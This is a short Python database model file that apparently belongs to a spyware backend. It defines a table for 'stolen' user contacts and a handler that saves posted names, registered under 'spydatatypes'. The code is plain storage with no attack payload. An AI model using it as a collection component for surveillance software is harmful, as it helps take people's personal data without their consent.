from app import db
from app.models import utility


class Contact(db.Model):
    """Models a stolen contact from a user"""
    __tablename__ = "contact"
    contact_id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    user_id = db.Column(db.Integer, db.ForeignKey("user.user_id"))
    firstname = db.Column(db.String(64), nullable=True)
    lastname = db.Column(db.String(64), nullable=True)

    @staticmethod
    def userdata_post_handler(user_id, contact_data_dict):
        """Adds posted userdata to database"""
        contact = Contact(user_id=int(user_id),
                          firstname=contact_data_dict.get("firstname"),
                          lastname=contact_data_dict.get("lastname"))
        db.session.add(contact)
        db.session.commit()

    def __repr__(self):
        return "<Contact {}.{} {}>".format(self.contact_id, self.firstname, self.lastname)

spydatatypes = {"contact": Contact}
